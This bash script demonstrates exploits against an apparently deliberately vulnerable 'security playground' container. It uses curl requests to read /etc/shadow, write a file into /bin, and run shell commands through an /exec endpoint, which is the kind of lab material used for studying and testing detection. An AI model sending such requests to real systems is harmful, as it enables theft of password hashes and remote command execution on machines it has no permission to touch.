#!/bin/bash
# Script to demonstrate how to interact with security playground

# Required parameters are the IP of a Node and then the port
# (Given this is a NodePort Service)

# Error if they don't specify an IP
if [ $1 == "" ]
  then
    echo "Error: No Node IP specified"
fi

# Error if they don't specify port
if [ $2 -eq 0 ]
  then
    echo "Error: No port specified"
fi

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $1:$2/etc/shadow

echo "2. Exploit writing \"hello-world\" to /bin/hello within our container"
curl -X POST $1:$2/bin/hello -d 'content=hello-world'
echo ""
echo "and then read it back remotely"
curl $1:$2/bin/hello
echo ""

echo "3. Exploit executing \"ls -la\" and sending it back to us"
curl -X POST $1:$2/exec -d 'command=ls -la'
